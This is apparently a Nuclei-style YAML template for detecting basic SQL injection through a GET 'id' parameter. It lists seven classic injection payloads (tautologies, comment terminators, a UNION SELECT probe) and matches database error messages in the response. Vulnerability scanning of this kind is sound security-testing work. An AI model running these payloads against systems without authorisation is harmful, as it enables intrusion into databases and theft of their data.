id: basic-sql-injection

info:
  name: Basic SQL Injection Test
  author: your-name
  severity: critical
  description: |
    Kiểm tra lỗ hổng SQL Injection cơ bản thông qua tham số GET.
  tags: sqli,sql,injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}?id={{payload}}"

    payloads:
      payload:
        - "' OR '1'='1"
        - "\" OR \"1\"=\"1"
        - "' OR 1=1--"
        - "\" OR 1=1--"
        - "1' AND 1=2 UNION SELECT NULL--"
        - "' OR 'a'='a"
        - "' OR 1=1#"

    attack: clusterbomb

    matchers:
      - type: word
        part: body
        words:
          - "sql syntax"
          - "mysql_fetch"
          - "ORA-"
          - "Warning: mysql_"
          - "You have an error in your SQL syntax"
          - "Unclosed quotation mark"
          - "ODBC"
        condition: or
